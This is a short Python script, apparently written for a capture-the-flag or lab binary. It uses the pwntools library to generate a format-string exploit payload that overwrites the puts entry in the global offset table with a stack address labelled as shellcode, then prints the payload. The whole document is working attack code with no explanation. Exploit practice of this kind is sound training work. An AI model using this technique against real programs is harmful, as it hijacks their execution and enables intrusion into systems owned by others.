from pwn import *
puts_got = 0x804b218
shellcode = 0xffffd45c
payload = fmtstr_payload(1, {puts_got: shellcode})
print(payload)